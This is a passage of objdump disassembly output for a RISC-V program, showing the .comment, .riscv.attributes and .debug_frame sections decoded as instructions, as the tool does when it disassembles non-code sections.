 932:	0079                	c.nop	30
 934:	6564                	ld	s1,200(a0)
 936:	76007473          	csrrci	s0,0x760,0
 93a:	7270                	ld	a2,224(a2)
 93c:	6e69                	lui	t3,0x1a
 93e:	6674                	ld	a3,200(a2)
 940:	746d                	lui	s0,0xffffb
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	3a434347          	fmsub.d	ft6,ft6,ft4,ft7,rmm
   4:	2820                	fld	fs0,80(s0)
   6:	29554e47          	fmsub.s	ft8,fa0,fs5,ft5,rmm
   a:	3720                	fld	fs0,104(a4)
   c:	322e                	fld	ft4,232(sp)
   e:	302e                	fld	ft0,232(sp)
  10:	4700                	lw	s0,8(a4)
  12:	203a4343          	fmadd.s	ft6,fs4,ft3,ft4,rmm
  16:	4728                	lw	a0,72(a4)
  18:	554e                	lw	a0,240(sp)
  1a:	2029                	0x2029
  1c:	2e39                	addiw	t3,t3,14
  1e:	2e32                	fld	ft8,264(sp)
  20:	0030                	addi	a2,sp,8

Disassembly of section .riscv.attributes:

0000000000000000 <.riscv.attributes>:
   0:	3441                	addiw	s0,s0,-16
   2:	0000                	unimp
   4:	7200                	ld	s0,32(a2)
   6:	7369                	lui	t1,0xffffa
   8:	01007663          	bleu	a6,zero,14 <_tdata_begin+0x14>
   c:	002a                	c.slli	zero,0xa
   e:	0000                	unimp
  10:	1004                	addi	s1,sp,32
  12:	7205                	lui	tp,0xfffe1
  14:	3676                	fld	fa2,376(sp)
  16:	6934                	ld	a3,80(a0)
  18:	7032                	0x7032
  1a:	5f30                	lw	a2,120(a4)
  1c:	326d                	addiw	tp,tp,-5
  1e:	3070                	fld	fa2,224(s0)
  20:	615f 7032 5f30      	0x5f307032615f
  26:	3266                	fld	ft4,120(sp)
  28:	3070                	fld	fa2,224(s0)
  2a:	645f 7032 5f30      	0x5f307032645f
  30:	30703263          	0x30703263
	...

Disassembly of section .debug_frame:

0000000000000000 <.debug_frame>:
   0:	000c                	0xc
   2:	0000                	unimp
   4:	ffff                	0xffff
   6:	ffff                	0xffff
   8:	0001                	nop
   a:	7c01                	lui	s8,0xfffe0
   c:	0d01                	addi	s10,s10,0
   e:	0002                	c.slli	zero,0x0
  10:	0024                	addi	s1,sp,8
  12:	0000                	unimp
  14:	0000                	unimp
  16:	0000                	unimp
  18:	1048                	addi	a0,sp,36
  1a:	8000                	0x8000
  1c:	0000                	unimp
  1e:	0000                	unimp
  20:	00ce                	slli	ra,ra,0x13
  22:	0000                	unimp
  24:	0000                	unimp
  26:	0000                	unimp
  28:	0e42                	slli	t3,t3,0x10
  2a:	4260                	lw	s0,68(a2)
  2c:	0288                	addi	a0,sp,320
  2e:	0c42                	slli	s8,s8,0x10
  30:	0008                	0x8
  32:	c402                	sw	zero,8(sp)
  34:	42c8                	lw	a0,4(a3)
  36:	020d                	addi	tp,tp,3
  38:	0024                	addi	s1,sp,8
  3a:	0000                	unimp
  3c:	0000                	unimp
  3e:	0000                	unimp
  40:	1116                	slli	sp,sp,0x25
  42:	8000                	0x8000
  44:	0000                	unimp
  46:	0000                	unimp
  48:	00ec                	addi	a1,sp,76
  4a:	0000                	unimp
  4c:	0000                	unimp
  4e:	0000                	unimp
  50:	0e42                	slli	t3,t3,0x10
  52:	4240                	lw	s0,4(a2)
  54:	0288                	addi	a0,sp,320
  56:	0c42                	slli	s8,s8,0x10
  58:	0008                	0x8
  5a:	e202                	sd	zero,256(sp)
  5c:	42c8                	lw	a0,4(a3)
  5e:	020d                	addi	tp,tp,3
  60:	002c                	addi	a1,sp,8
  62:	0000                	unimp
  64:	0000                	unimp
  66:	0000                	unimp
  68:	1202                	slli	tp,tp,0x20
  6a:	8000                	0x8000
  6c:	0000                	unimp
  6e:	0000                	unimp
  70:	0058                	addi	a4,sp,4
  72:	0000                	unimp
  74:	0000                	unimp
  76:	0000                	unimp
  78:	0e42                	slli	t3,t3,0x10
  7a:	4440                	lw	s0,12(s0)
  7c:	0281                	addi	t0,t0,0
  7e:	0488                	addi	a0,sp,576
  80:	0c42                	slli	s8,s8,0x10
  82:	0008                	0x8
  84:	4a02                	lw	s4,0(sp)
  86:	42c1                	li	t0,16
  88:	42c8                	lw	a0,4(a3)
  8a:	020d                	addi	tp,tp,3
  8c:	0000                	unimp
  8e:	0000                	unimp
  90:	002c                	addi	a1,sp,8
  92:	0000                	unimp
  94:	0000                	unimp
  96:	0000                	unimp
  98:	125a                	slli	tp,tp,0x36
  9a:	8000                	0x8000
  9c:	0000                	unimp
  9e:	0000                	unimp
  a0:	0282                	slli	t0,t0,0x0
  a2:	0000                	unimp
  a4:	0000                	unimp
  a6:	0000                	unimp
  a8:	0e42                	slli	t3,t3,0x10
  aa:	0180                	addi	s0,sp,192
  ac:	8144                	0x8144
  ae:	8802                	jr	a6
  b0:	4204                	lw	s1,0(a2)
  b2:	080c                	addi	a1,sp,16
  b4:	0300                	addi	s0,sp,384
  b6:	0274                	addi	a3,sp,268
  b8:	42c1                	li	t0,16
  ba:	42c8                	lw	a0,4(a3)
  bc:	020d                	addi	tp,tp,3
  be:	0000                	unimp
  c0:	000c                	0xc
  c2:	0000                	unimp
  c4:	ffff                	0xffff
  c6:	ffff                	0xffff
  c8:	0001                	nop
  ca:	7c01                	lui	s8,0xfffe0
  cc:	0d01                	addi	s10,s10,0
  ce:	0002                	c.slli	zero,0x0
  d0:	002c                	addi	a1,sp,8
  d2:	0000                	unimp
  d4:	00c0                	addi	s0,sp,68
  d6:	0000                	unimp
  d8:	150a                	slli	a0,a0,0x22
  da:	8000                	0x8000
  dc:	0000                	unimp
  de:	0000                	unimp
  e0:	001c                	0x1c
  e2:	0000                	unimp
  e4:	0000                	unimp
  e6:	0000                	unimp
  e8:	0e42                	slli	t3,t3,0x10
  ea:	4230                	lw	a2,64(a2)
  ec:	0288                	addi	a0,sp,320
  ee:	0c42                	slli	s8,s8,0x10
  f0:	0008                	0x8
  f2:	c852                	sw	s4,16(sp)
  f4:	020c                	addi	a1,sp,256
  f6:	4230                	lw	a2,64(a2)
  f8:	000e                	c.slli	zero,0x3
  fa:	0000                	unimp
  fc:	0000                	unimp
  fe:	0000                	unimp
 100:	002c                	addi	a1,sp,8
 102:	0000                	unimp
 104:	00c0                	addi	s0,sp,68
 106:	0000                	unimp
 108:	1526                	slli	a0,a0,0x29
 10a:	8000                	0x8000
 10c:	0000                	unimp
 10e:	0000                	unimp
 110:	001c                	0x1c
 112:	0000                	unimp
 114:	0000                	unimp
 116:	0000                	unimp
 118:	0e42                	slli	t3,t3,0x10
 11a:	4230                	lw	a2,64(a2)
 11c:	0288                	addi	a0,sp,320
 11e:	0c42                	slli	s8,s8,0x10
 120:	0008                	0x8
 122:	c852                	sw	s4,16(sp)
 124:	020c                	addi	a1,sp,256
 126:	4230                	lw	a2,64(a2)
 128:	000e                	c.slli	zero,0x3
 12a:	0000                	unimp
 12c:	0000                	unimp
 12e:	0000                	unimp
 130:	002c                	addi	a1,sp,8
 132:	0000                	unimp
 134:	00c0                	addi	s0,sp,68
 136:	0000                	unimp
 138:	1542                	slli	a0,a0,0x30
 13a:	8000                	0x8000
 13c:	0000                	unimp
 13e:	0000                	unimp
 140:	010a                	slli	sp,sp,0x2
 142:	0000                	unimp
 144:	0000                	unimp
 146:	0000                	unimp
 148:	0e42                	slli	t3,t3,0x10
 14a:	4250                	lw	a2,4(a2)
 14c:	0288                	addi	a0,sp,320
 14e:	0c42                	slli	s8,s8,0x10
 150:	0008                	0x8
 152:	c8010003          	lb	zero,-896(sp)
 156:	020c                	addi	a1,sp,256
 158:	4250                	lw	a2,4(a2)
 15a:	000e                	c.slli	zero,0x3
 15c:	0000                	unimp
 15e:	0000                	unimp
 160:	002c                	addi	a1,sp,8
 162:	0000                	unimp
 164:	00c0                	addi	s0,sp,68
 166:	0000                	unimp
 168:	164c                	addi	a1,sp,804
 16a:	8000                	0x8000
 16c:	0000                	unimp
 16e:	0000                	unimp
 170:	0122                	slli	sp,sp,0x8
 172:	0000                	unimp
 174:	0000                	unimp
 176:	0000                	unimp
 178:	0e42                	slli	t3,t3,0x10
 17a:	4260                	lw	s0,68(a2)
 17c:	0288                	addi	a0,sp,320
 17e:	0c42                	slli	s8,s8,0x10
 180:	0008                	0x8
 182:	c8011803          	lh	a6,-896(sp)
 186:	020c                	addi	a1,sp,256
 188:	4260                	lw	s0,68(a2)
 18a:	000e                	c.slli	zero,0x3
 18c:	0000                	unimp
 18e:	0000                	unimp
 190:	002c                	addi	a1,sp,8
 192:	0000                	unimp
 194:	00c0                	addi	s0,sp,68
 196:	0000                	unimp
 198:	176e                	slli	a4,a4,0x3b
 19a:	8000                	0x8000
 19c:	0000                	unimp
 19e:	0000                	unimp
 1a0:	008a                	slli	ra,ra,0x2
 1a2:	0000                	unimp
 1a4:	0000                	unimp
 1a6:	0000                	unimp
 1a8:	0e42                	slli	t3,t3,0x10
 1aa:	4220                	lw	s0,64(a2)
 1ac:	0288                	addi	a0,sp,320
 1ae:	0c42                	slli	s8,s8,0x10
 1b0:	0008                	0x8
 1b2:	8002                	0x8002
 1b4:	0cc8                	addi	a0,sp,596
 1b6:	2002                	fld	ft0,0(sp)
 1b8:	0e42                	slli	t3,t3,0x10
 1ba:	0000                	unimp
 1bc:	0000                	unimp
 1be:	0000                	unimp
 1c0:	002c                	addi	a1,sp,8
 1c2:	0000                	unimp
 1c4:	00c0                	addi	s0,sp,68
 1c6:	0000                	unimp
 1c8:	17f8                	addi	a4,sp,1004
 1ca:	8000                	0x8000
 1cc:	0000                	unimp
 1ce:	0000                	unimp
 1d0:	0036                	c.slli	zero,0xd
 1d2:	0000                	unimp
 1d4:	0000                	unimp
 1d6:	0000                	unimp
 1d8:	0e42                	slli	t3,t3,0x10
 1da:	4230                	lw	a2,64(a2)
 1dc:	0288                	addi	a0,sp,320
 1de:	0c42                	slli	s8,s8,0x10
 1e0:	0008                	0x8
 1e2:	c86c                	sw	a1,84(s0)
 1e4:	020c                	addi	a1,sp,256
 1e6:	4230                	lw	a2,64(a2)
 1e8:	000e                	c.slli	zero,0x3
 1ea:	0000                	unimp
 1ec:	0000                	unimp
 1ee:	0000                	unimp
 1f0:	002c                	addi	a1,sp,8
 1f2:	0000                	unimp
 1f4:	00c0                	addi	s0,sp,68
 1f6:	0000                	unimp
 1f8:	182e                	slli	a6,a6,0x2b
 1fa:	8000                	0x8000
 1fc:	0000                	unimp
 1fe:	0000                	unimp
 200:	007e                	c.slli	zero,0x1f
 202:	0000                	unimp
 204:	0000                	unimp
 206:	0000                	unimp
 208:	0e42                	slli	t3,t3,0x10
 20a:	01b0                	addi	a2,sp,200
 20c:	8842                	mv	a6,a6
 20e:	4202                	lw	tp,0(sp)
 210:	080c                	addi	a1,sp,16
 212:	0200                	addi	s0,sp,256
 214:	c874                	sw	a3,84(s0)
 216:	020c                	addi	a1,sp,256
 218:	01b0                	addi	a2,sp,200
 21a:	0e42                	slli	t3,t3,0x10
 21c:	0000                	unimp
 21e:	0000                	unimp
 220:	002c                	addi	a1,sp,8
 222:	0000                	unimp
 224:	00c0                	addi	s0,sp,68
 226:	0000                	unimp
 228:	18ac                	addi	a1,sp,120
 22a:	8000                	0x8000
 22c:	0000                	unimp
 22e:	0000                	unimp
 230:	0110                	addi	a2,sp,128
 232:	0000                	unimp
 234:	0000                	unimp
 236:	0000                	unimp
 238:	0e42                	slli	t3,t3,0x10
 23a:	4250                	lw	a2,4(a2)
 23c:	0288                	addi	a0,sp,320
 23e:	0c42                	slli	s8,s8,0x10
 240:	0008                	0x8
 242:	c8010603          	lb	a2,-896(sp)
 246:	020c                	addi	a1,sp,256
 248:	4250                	lw	a2,4(a2)
 24a:	000e                	c.slli	zero,0x3
 24c:	0000                	unimp
 24e:	0000                	unimp
 250:	0024                	addi	s1,sp,8
 252:	0000                	unimp
 254:	00c0                	addi	s0,sp,68
 256:	0000                	unimp
 258:	19bc                	addi	a5,sp,248
 25a:	8000                	0x8000
 25c:	0000                	unimp
 25e:	0000                	unimp
 260:	0020                	addi	s0,sp,8
 262:	0000                	unimp
 264:	0000                	unimp
 266:	0000                	unimp
 268:	0e42                	slli	t3,t3,0x10
 26a:	4220                	lw	s0,64(a2)
 26c:	0288                	addi	a0,sp,320
 26e:	0c42                	slli	s8,s8,0x10
 270:	0008                	0x8
 272:	0000                	unimp
 274:	0000                	unimp
 276:	0000                	unimp
 278:	0024                	addi	s1,sp,8
 27a:	0000                	unimp
 27c:	00c0                	addi	s0,sp,68
 27e:	0000                	unimp
 280:	19dc                	addi	a5,sp,244
 282:	8000                	0x8000
 284:	0000                	unimp
 286:	0000                	unimp
 288:	001c                	0x1c
 28a:	0000                	unimp
 28c:	0000                	unimp
 28e:	0000                	unimp
 290:	0e42                	slli	t3,t3,0x10
 292:	4430                	lw	a2,72(s0)
 294:	0281                	addi	t0,t0,0
 296:	0488                	addi	a0,sp,576
 298:	0c42                	slli	s8,s8,0x10
 29a:	0008                	0x8
 29c:	0000                	unimp
 29e:	0000                	unimp
 2a0:	0024                	addi	s1,sp,8
 2a2:	0000                	unimp
 2a4:	00c0                	addi	s0,sp,68
 2a6:	0000                	unimp
 2a8:	19f8                	addi	a4,sp,252
 2aa:	8000                	0x8000
 2ac:	0000                	unimp
 2ae:	0000                	unimp
 2b0:	0018                	0x18
 2b2:	0000                	unimp
 2b4:	0000                	unimp
 2b6:	0000                	unimp
 2b8:	0e42                	slli	t3,t3,0x10
 2ba:	4420                	lw	s0,72(s0)
 2bc:	0281                	addi	t0,t0,0
 2be:	0488                	addi	a0,sp,576
 2c0:	0c42                	slli	s8,s8,0x10
 2c2:	0008                	0x8
 2c4:	0000                	unimp
 2c6:	0000                	unimp
 2c8:	0024                	addi	s1,sp,8
 2ca:	0000                	unimp
 2cc:	00c0                	addi	s0,sp,68
 2ce:	0000                	unimp
 2d0:	1a10                	addi	a2,sp,304
 2d2:	8000                	0x8000
 2d4:	0000                	unimp
 2d6:	0000                	unimp
 2d8:	0010                	0x10
 2da:	0000                	unimp
 2dc:	0000                	unimp
 2de:	0000                	unimp
 2e0:	0e42                	slli	t3,t3,0x10
 2e2:	4410                	lw	a2,8(s0)
 2e4:	0281                	addi	t0,t0,0
 2e6:	0488                	addi	a0,sp,576
 2e8:	0c42                	slli	s8,s8,0x10
 2ea:	0008                	0x8
 2ec:	0000                	unimp
 2ee:	0000                	unimp
 2f0:	0034                	addi	a3,sp,8
 2f2:	0000                	unimp
 2f4:	00c0                	addi	s0,sp,68
 2f6:	0000                	unimp
 2f8:	1a20                	addi	s0,sp,312
 2fa:	8000                	0x8000
 2fc:	0000                	unimp
 2fe:	0000                	unimp
 300:	0036                	c.slli	zero,0xd
 302:	0000                	unimp
 304:	0000                	unimp
 306:	0000                	unimp
 308:	0e42                	slli	t3,t3,0x10
 30a:	4630                	lw	a2,72(a2)
 30c:	0281                	addi	t0,t0,0
 30e:	0488                	addi	a0,sp,576
 310:	0689                	addi	a3,a3,2
 312:	0c42                	slli	s8,s8,0x10
 314:	0008                	0x8
 316:	c164                	sw	s1,68(a0)
 318:	c842                	sw	a6,16(sp)
 31a:	020c                	addi	a1,sp,256
 31c:	4230                	lw	a2,64(a2)
 31e:	42c9                	li	t0,18
 320:	000e                	c.slli	zero,0x3
 322:	0000                	unimp
 324:	0000                	unimp
 326:	0000                	unimp
 328:	002c                	addi	a1,sp,8
 32a:	0000                	unimp
 32c:	00c0                	addi	s0,sp,68
 32e:	0000                	unimp
 330:	1a56                	slli	s4,s4,0x35
 332:	8000                	0x8000
 334:	0000                	unimp
 336:	0000                	unimp
 338:	0026                	c.slli	zero,0x9
 33a:	0000                	unimp
 33c:	0000                	unimp
 33e:	0000                	unimp
 340:	0e42                	slli	t3,t3,0x10
 342:	4220                	lw	s0,64(a2)
 344:	0288                	addi	a0,sp,320
 346:	0c42                	slli	s8,s8,0x10
 348:	0008                	0x8
 34a:	c85c                	sw	a5,20(s0)
 34c:	020c                	addi	a1,sp,256
 34e:	4220                	lw	s0,64(a2)
 350:	000e                	c.slli	zero,0x3
 352:	0000                	unimp
 354:	0000                	unimp
 356:	0000                	unimp
 358:	002c                	addi	a1,sp,8
 35a:	0000                	unimp
 35c:	00c0                	addi	s0,sp,68
 35e:	0000                	unimp
 360:	1a7c                	addi	a5,sp,316
 362:	8000                	0x8000
 364:	0000                	unimp
 366:	0000                	unimp
 368:	002a                	c.slli	zero,0xa
 36a:	0000                	unimp
 36c:	0000                	unimp
 36e:	0000                	unimp
 370:	0e42                	slli	t3,t3,0x10
 372:	4420                	lw	s0,72(s0)
 374:	0281                	addi	t0,t0,0
 376:	0488                	addi	a0,sp,576
 378:	0c42                	slli	s8,s8,0x10
 37a:	0008                	0x8
 37c:	c15c                	sw	a5,4(a0)
 37e:	c842                	sw	a6,16(sp)
 380:	020c                	addi	a1,sp,256
 382:	4220                	lw	s0,64(a2)
 384:	000e                	c.slli	zero,0x3
 386:	0000                	unimp
 388:	002c                	addi	a1,sp,8
 38a:	0000                	unimp
 38c:	00c0                	addi	s0,sp,68
 38e:	0000                	unimp
 390:	1aa6                	slli	s5,s5,0x29
 392:	8000                	0x8000
 394:	0000                	unimp
 396:	0000                	unimp
 398:	005a                	c.slli	zero,0x16
 39a:	0000                	unimp
 39c:	0000                	unimp
 39e:	0000                	unimp
 3a0:	0e42                	slli	t3,t3,0x10
 3a2:	4420                	lw	s0,72(s0)
 3a4:	0281                	addi	t0,t0,0
 3a6:	0488                	addi	a0,sp,576
 3a8:	0c42                	slli	s8,s8,0x10
 3aa:	0008                	0x8
 3ac:	4c02                	lw	s8,0(sp)
 3ae:	42c1                	li	t0,16
 3b0:	0cc8                	addi	a0,sp,596
 3b2:	2002                	fld	ft0,0(sp)
 3b4:	0e42                	slli	t3,t3,0x10
 3b6:	0000                	unimp
 3b8:	0024                	addi	s1,sp,8
 3ba:	0000                	unimp
 3bc:	00c0                	addi	s0,sp,68
 3be:	0000                	unimp
 3c0:	1b00                	addi	s0,sp,432
 3c2:	8000                	0x8000
 3c4:	0000                	unimp
 3c6:	0000                	unimp
 3c8:	00e6                	slli	ra,ra,0x19
 3ca:	0000                	unimp
 3cc:	0000                	unimp
 3ce:	0000                	unimp
 3d0:	0e42                	slli	t3,t3,0x10
 3d2:	01b0                	addi	a2,sp,200
 3d4:	8146                	mv	sp,a7
 3d6:	8802                	jr	a6
 3d8:	8904                	0x8904
 3da:	4206                	lw	tp,64(sp)
 3dc:	080c                	addi	a1,sp,16
 3de:	0000                	unimp
 3e0:	002c                	addi	a1,sp,8
 3e2:	0000                	unimp
 3e4:	00c0                	addi	s0,sp,68
 3e6:	0000                	unimp
 3e8:	1be6                	slli	s7,s7,0x39
 3ea:	8000                	0x8000
 3ec:	0000                	unimp
 3ee:	0000                	unimp
 3f0:	0072                	c.slli	zero,0x1c
 3f2:	0000                	unimp
 3f4:	0000                	unimp
 3f6:	0000                	unimp
 3f8:	0e42                	slli	t3,t3,0x10
 3fa:	4420                	lw	s0,72(s0)
 3fc:	0281                	addi	t0,t0,0
 3fe:	0488                	addi	a0,sp,576
 400:	0c42                	slli	s8,s8,0x10
 402:	0008                	0x8
 404:	6402                	ld	s0,0(sp)
 406:	42c1                	li	t0,16
 408:	0cc8                	addi	a0,sp,596
 40a:	2002                	fld	ft0,0(sp)
 40c:	0e42                	slli	t3,t3,0x10
 40e:	0000                	unimp
 410:	002c                	addi	a1,sp,8
 412:	0000                	unimp
 414:	00c0                	addi	s0,sp,68
 416:	0000                	unimp
 418:	1c58                	addi	a4,sp,564
 41a:	8000                	0x8000
 41c:	0000                	unimp
 41e:	0000                	unimp
 420:	008e                	slli	ra,ra,0x3
 422:	0000                	unimp
 424:	0000                	unimp
 426:	0000                	unimp
 428:	0e42                	slli	t3,t3,0x10
 42a:	4440                	lw	s0,12(s0)
 42c:	0281                	addi	t0,t0,0
 42e:	0488                	addi	a0,sp,576
 430:	0c42                	slli	s8,s8,0x10
 432:	0008                	0x8
 434:	8002                	0x8002
 436:	42c1                	li	t0,16
 438:	0cc8                	addi	a0,sp,596
 43a:	4002                	0x4002
 43c:	0e42                	slli	t3,t3,0x10
 43e:	0000                	unimp
 440:	0034                	addi	a3,sp,8
 442:	0000                	unimp
 444:	00c0                	addi	s0,sp,68
 446:	0000                	unimp
 448:	1ce6                	slli	s9,s9,0x39
 44a:	8000                	0x8000
 44c:	0000                	unimp
 44e:	0000                	unimp
 450:	0102                	slli	sp,sp,0x0
 452:	0000                	unimp
 454:	0000                	unimp
 456:	0000                	unimp
 458:	0e42                	slli	t3,t3,0x10
 45a:	02d0                	addi	a2,sp,324
 45c:	8144                	0x8144
 45e:	8802                	jr	a6
 460:	4204                	lw	s1,0(a2)
 462:	080c                	addi	a1,sp,16
 464:	0200                	addi	s0,sp,256
 466:	c1f4                	sw	a3,68(a1)
 468:	c842                	sw	a6,16(sp)
 46a:	020c                	addi	a1,sp,256
 46c:	02d0                	addi	a2,sp,324
 46e:	0e42                	slli	t3,t3,0x10
	...
 478:	002c                	addi	a1,sp,8
 47a:	0000                	unimp
 47c:	00c0                	addi	s0,sp,68
 47e:	0000                	unimp
 480:	1de8                	addi	a0,sp,764
 482:	8000                	0x8000
 484:	0000                	unimp
 486:	0000                	unimp
 488:	006c                	addi	a1,sp,12
 48a:	0000                	unimp
 48c:	0000                	unimp
 48e:	0000                	unimp
 490:	0e42                	slli	t3,t3,0x10
 492:	4220                	lw	s0,64(a2)
 494:	0288                	addi	a0,sp,320
 496:	0c42                	slli	s8,s8,0x10
 498:	0008                	0x8
 49a:	6202                	ld	tp,0(sp)
 49c:	0cc8                	addi	a0,sp,596
 49e:	2002                	fld	ft0,0(sp)
 4a0:	0e42                	slli	t3,t3,0x10
 4a2:	0000                	unimp
 4a4:	0000                	unimp
 4a6:	0000                	unimp
 4a8:	002c                	addi	a1,sp,8
 4aa:	0000                	unimp
 4ac:	00c0                	addi	s0,sp,68
 4ae:	0000                	unimp
 4b0:	1e54                	addi	a3,sp,820
 4b2:	8000                	0x8000
 4b4:	0000                	unimp
 4b6:	0000                	unimp
 4b8:	0068                	addi	a0,sp,12
 4ba:	0000                	unimp
 4bc:	0000                	unimp
 4be:	0000                	unimp
 4c0:	0e42                	slli	t3,t3,0x10
 4c2:	4220                	lw	s0,64(a2)
 4c4:	0288                	addi	a0,sp,320
 4c6:	0c42                	slli	s8,s8,0x10
 4c8:	0008                	0x8
 4ca:	5e02                	lw	t3,32(sp)
 4cc:	0cc8                	addi	a0,sp,596
 4ce:	2002                	fld	ft0,0(sp)
 4d0:	0e42                	slli	t3,t3,0x10
 4d2:	0000                	unimp
 4d4:	0000                	unimp
 4d6:	0000                	unimp
 4d8:	0034                	addi	a3,sp,8
 4da:	0000                	unimp
 4dc:	00c0                	addi	s0,sp,68
 4de:	0000                	unimp
 4e0:	1ebc                	addi	a5,sp,888
 4e2:	8000                	0x8000
 4e4:	0000                	unimp
 4e6:	0000                	unimp
 4e8:	035e                	slli	t1,t1,0x17
 4ea:	0000                	unimp
 4ec:	0000                	unimp
 4ee:	0000                	unimp
 4f0:	0e42                	slli	t3,t3,0x10
 4f2:	4870                	lw	a2,84(s0)
 4f4:	0281                	addi	t0,t0,0
 4f6:	0488                	addi	a0,sp,576
 4f8:	0689                	addi	a3,a3,2
 4fa:	0892                	slli	a7,a7,0x4
 4fc:	0c42                	slli	s8,s8,0x10
 4fe:	0008                	0x8
 500:	c1034803          	lbu	a6,-1008(t1) # ffffffffffff9c10 <_end+0xffffffff7ffde990>
 504:	c842                	sw	a6,16(sp)
 506:	020c                	addi	a1,sp,256
 508:	4270                	lw	a2,68(a2)
 50a:	42c9                	li	t0,18
 50c:	42d2                	lw	t0,20(sp)
 50e:	000e                	c.slli	zero,0x3
 510:	002c                	addi	a1,sp,8
 512:	0000                	unimp
 514:	00c0                	addi	s0,sp,68
 516:	0000                	unimp
 518:	221a                	fld	ft4,384(sp)
 51a:	8000                	0x8000
 51c:	0000                	unimp
 51e:	0000                	unimp
 520:	0056                	c.slli	zero,0x15
 522:	0000                	unimp
 524:	0000                	unimp
 526:	0000                	unimp
 528:	0e42                	slli	t3,t3,0x10
 52a:	4470                	lw	a2,76(s0)
 52c:	1281                	addi	t0,t0,-32
 52e:	1488                	addi	a0,sp,608
 530:	0c42                	slli	s8,s8,0x10
 532:	4008                	lw	a0,0(s0)
 534:	4802                	lw	a6,0(sp)
 536:	42c1                	li	t0,16
 538:	0cc8                	addi	a0,sp,596
 53a:	7002                	0x7002
 53c:	0e42                	slli	t3,t3,0x10
 53e:	0000                	unimp
 540:	002c                	addi	a1,sp,8
 542:	0000                	unimp
 544:	00c0                	addi	s0,sp,68
 546:	0000                	unimp
 548:	2270                	fld	fa2,192(a2)
 54a:	8000                	0x8000
 54c:	0000                	unimp
 54e:	0000                	unimp
 550:	0046                	c.slli	zero,0x11
 552:	0000                	unimp
 554:	0000                	unimp
 556:	0000                	unimp
 558:	0e42                	slli	t3,t3,0x10
 55a:	4240                	lw	s0,4(a2)
 55c:	0288                	addi	a0,sp,320
 55e:	0c42                	slli	s8,s8,0x10
 560:	0008                	0x8
 562:	c87c                	sw	a5,84(s0)
 564:	020c                	addi	a1,sp,256
 566:	4240                	lw	s0,4(a2)
 568:	000e                	c.slli	zero,0x3
 56a:	0000                	unimp
 56c:	0000                	unimp
 56e:	0000                	unimp
 570:	0034                	addi	a3,sp,8
 572:	0000                	unimp
 574:	00c0                	addi	s0,sp,68
 576:	0000                	unimp
 578:	22b6                	fld	ft5,328(sp)
 57a:	8000                	0x8000
 57c:	0000                	unimp
 57e:	0000                	unimp
 580:	00c2                	slli	ra,ra,0x10
 582:	0000                	unimp
 584:	0000                	unimp
 586:	0000                	unimp
 588:	0e42                	slli	t3,t3,0x10
 58a:	0290                	addi	a2,sp,320
 58c:	8144                	0x8144
 58e:	880e                	mv	a6,gp
 590:	4210                	lw	a2,0(a2)
 592:	080c                	addi	a1,sp,16
 594:	0230                	addi	a2,sp,264
 596:	c1b4                	sw	a3,64(a1)
 598:	c842                	sw	a6,16(sp)
 59a:	020c                	addi	a1,sp,256
 59c:	0290                	addi	a2,sp,320
 59e:	0e42                	slli	t3,t3,0x10
	...
 5a8:	002c                	addi	a1,sp,8
 5aa:	0000                	unimp
 5ac:	00c0                	addi	s0,sp,68
 5ae:	0000                	unimp
 5b0:	2378                	fld	fa4,192(a4)
 5b2:	8000                	0x8000
 5b4:	0000                	unimp
 5b6:	0000                	unimp
 5b8:	00b8                	addi	a4,sp,72
 5ba:	0000                	unimp
 5bc:	0000                	unimp
 5be:	0000                	unimp
 5c0:	0e42                	slli	t3,t3,0x10
 5c2:	4250                	lw	a2,4(a2)
 5c4:	0288                	addi	a0,sp,320
 5c6:	0c42                	slli	s8,s8,0x10
 5c8:	0008                	0x8
 5ca:	ae02                	fsd	ft0,280(sp)
 5cc:	0cc8                	addi	a0,sp,596
 5ce:	5002                	0x5002
 5d0:	0e42                	slli	t3,t3,0x10
 5d2:	0000                	unimp
 5d4:	0000                	unimp
 5d6:	0000                	unimp
 5d8:	002c                	addi	a1,sp,8
 5da:	0000                	unimp
 5dc:	00c0                	addi	s0,sp,68
 5de:	0000                	unimp
 5e0:	2430                	fld	fa2,72(s0)
 5e2:	8000                	0x8000
 5e4:	0000                	unimp
 5e6:	0000                	unimp
 5e8:	00ce                	slli	ra,ra,0x13
 5ea:	0000                	unimp
 5ec:	0000                	unimp
 5ee:	0000                	unimp
 5f0:	0e42                	slli	t3,t3,0x10
 5f2:	4250                	lw	a2,4(a2)
 5f4:	0288                	addi	a0,sp,320
 5f6:	0c42                	slli	s8,s8,0x10
 5f8:	0008                	0x8
 5fa:	c402                	sw	zero,8(sp)
 5fc:	0cc8                	addi	a0,sp,596
 5fe:	5002                	0x5002
 600:	0e42                	slli	t3,t3,0x10
 602:	0000                	unimp
 604:	0000                	unimp
 606:	0000                	unimp
 608:	002c                	addi	a1,sp,8
 60a:	0000                	unimp
 60c:	00c0                	addi	s0,sp,68
 60e:	0000                	unimp
 610:	24fe                	fld	fs1,472(sp)
 612:	8000                	0x8000
 614:	0000                	unimp
 616:	0000                	unimp
 618:	003c                	addi	a5,sp,8
 61a:	0000                	unimp
 61c:	0000                	unimp
 61e:	0000                	unimp
 620:	0e42                	slli	t3,t3,0x10
 622:	4230                	lw	a2,64(a2)
 624:	0288                	addi	a0,sp,320
 626:	0c42                	slli	s8,s8,0x10
 628:	0008                	0x8
 62a:	c872                	sw	t3,16(sp)
 62c:	020c                	addi	a1,sp,256
 62e:	4230                	lw	a2,64(a2)
 630:	000e                	c.slli	zero,0x3
 632:	0000                	unimp
 634:	0000                	unimp
 636:	0000                	unimp
 638:	002c                	addi	a1,sp,8
 63a:	0000                	unimp
 63c:	00c0                	addi	s0,sp,68
 63e:	0000                	unimp
 640:	253a                	fld	fa0,392(sp)
 642:	8000                	0x8000
 644:	0000                	unimp
 646:	0000                	unimp
 648:	004e                	c.slli	zero,0x13
 64a:	0000                	unimp
 64c:	0000                	unimp
 64e:	0000                	unimp
 650:	0e42                	slli	t3,t3,0x10
 652:	4230                	lw	a2,64(a2)
 654:	0288                	addi	a0,sp,320
 656:	0c42                	slli	s8,s8,0x10
 658:	0008                	0x8
 65a:	4402                	lw	s0,0(sp)
 65c:	0cc8                	addi	a0,sp,596
 65e:	3002                	fld	ft0,32(sp)
 660:	0e42                	slli	t3,t3,0x10
 662:	0000                	unimp
 664:	0000                	unimp
 666:	0000                	unimp
 668:	002c                	addi	a1,sp,8
 66a:	0000                	unimp
 66c:	00c0                	addi	s0,sp,68
 66e:	0000                	unimp
 670:	2588                	fld	fa0,8(a1)
 672:	8000                	0x8000
 674:	0000                	unimp
 676:	0000                	unimp
 678:	0070                	addi	a2,sp,12
